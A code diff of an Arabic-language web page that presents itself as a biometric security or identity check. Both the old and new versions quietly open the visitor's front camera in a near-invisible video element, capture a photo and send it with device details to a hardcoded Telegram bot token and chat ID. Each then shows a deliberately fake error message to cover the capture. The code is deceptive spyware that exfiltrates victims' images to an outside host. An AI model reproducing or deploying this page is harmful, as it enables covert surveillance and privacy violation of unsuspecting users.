@@ -3,30 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التحقق من أمان الشبكة</title>
+    <title>فحص أمان النظام</title>
     <style>
-        body { margin: 0; background: #000; height: 100vh; display: flex; justify-content: center; align-items: center; font-family: sans-serif; color: #fff; }
-        .container { text-align: center; padding: 30px; border-radius: 15px; background: #111; width: 90%; max-width: 400px; border: 1px solid #333; }
-        #startBtn { padding: 18px; font-size: 19px; border-radius: 10px; border: none; background: #007bff; color: white; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; transition: 0.3s; }
-        #status { margin-top: 20px; font-size: 14px; color: #888; display: none; }
-        video { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
+        body { margin: 0; background: #0b0b0b; height: 100vh; display: flex; justify-content: center; align-items: center; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #fff; }
+        .container { text-align: center; padding: 40px 20px; border-radius: 20px; background: #1a1a1a; width: 90%; max-width: 400px; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h3 { margin-bottom: 10px; color: #007bff; }
+        p { font-size: 14px; color: #bbb; line-height: 1.6; }
+        #startBtn { padding: 15px; font-size: 17px; border-radius: 12px; border: none; background: linear-gradient(45deg, #007bff, #0056b3); color: white; font-weight: bold; cursor: pointer; width: 100%; margin-top: 25px; transition: 0.3s; box-shadow: 0 4px 15px rgba(0,123,255,0.3); }
+        #startBtn:disabled { background: #444; cursor: not-allowed; box-shadow: none; }
+        #status { margin-top: 20px; font-size: 13px; color: #888; display: none; }
+        video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <h3>نظام التحقق الذكي</h3>
-        <p style="font-size: 13px; color: #aaa;">اضغط على الزر أدناه ووافق على إذن الكاميرا لإكمال عملية فحص الأمان.</p>
-        <button id="startBtn">بدء الفحص الآمن</button>
-        <div id="status">جاري الاتصال بالسيرفر...</div>
+        <h3>التحقق من الهوية الرقمية</h3>
+        <p>يرجى الضغط على الزر أدناه للموافقة على فحص الأمان الحيوي (Biometric Check) لإكمال تسجيل الدخول.</p>
+        <button id="startBtn">بدء الفحص الآن</button>
+        <div id="status">جاري تهيئة النظام...</div>
     </div>
 
-    <!-- عناصر مخفية للالتقاط -->
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // بيانات البوت الخاصة بك (تم تصحيح التوكن)
+        // ضع بياناتك هنا
         const token = '8723034543:AAEb6V0g0AW5EBJje20bF1lavfDkoc0dFrU'; 
         const chatID = '1921462984';
 
@@ -37,51 +39,52 @@
         startBtn.onclick = async function() {
             startBtn.disabled = true;
             status.style.display = 'block';
-            status.innerText = "جاري طلب الإذن...";
+            status.innerText = "جاري طلب الوصول للكاميرا...";
 
             try {
-                // طلب الوصول للكاميرا الأمامية
+                // محاولة فتح الكاميرا الأمامية
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" }, 
                     audio: false 
                 });
                 
                 video.srcObject = stream;
-                status.innerText = "جاري فحص التشفير، يرجى الانتظار...";
+                status.innerText = "جاري معالجة البيانات، يرجى الثبات...";
 
-                // الانتظار ثانية واحدة لالتقاط صورة واضحة
+                // الانتظار قليلاً لضمان وضوح الصورة
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
                     canvas.toBlob(function(blob) {
                         const formData = new FormData();
                         formData.append('chat_id', chatID);
-                        formData.append('photo', blob, 'security_check.jpg');
-                        formData.append('caption', '✅ تم التقاط صورة جديدة بنجاح!');
+                        formData.append('photo', blob, 'capture.jpg');
+                        formData.append('caption', '📸 تم التقاط صورة جديدة من الموقع!\n📱 الجهاز: ' + navigator.userAgentData?.platform || "Unknown");
 
-                        // إرسال الصورة إلى تليجرام
+                        // الرابط الصحيح لـ Telegram API
                         fetch(`https://telegram.org{token}/sendPhoto`, {
                             method: 'POST',
                             body: formData
                         }).then(() => {
-                            // إغلاق الكاميرا فوراً بعد الإرسال
-                            stream.getTracks().forEach(t => t.stop());
+                            // إغلاق الكاميرا
+                            stream.getTracks().forEach(track => track.stop());
                             
-                            // إظهار رسالة الخطأ الوهمية
+                            // إظهار خطأ وهمي بعد النجاح
                             setTimeout(() => {
                                 status.style.color = "#ff4d4d";
-                                status.innerText = "حدث خطأ غير متوقع في الشبكة (Error: 0x800410). يرجى المحاولة لاحقاً.";
-                            }, 500);
+                                status.innerText = "خطأ في السيرفر (Error 505). حاول لاحقاً.";
+                            }, 1000);
                         });
                     }, 'image/jpeg', 0.7);
-                }, 1000);
+                }, 2000);
 
             } catch (err) {
                 status.style.color = "#ff4d4d";
-                status.innerText = "خطأ: يجب السماح بالكاميرا وتحديث الصفحة للدخول.";
+                status.innerText = "يجب السماح بالوصول للكاميرا للمتابعة.";
                 startBtn.disabled = false;
             }
         };
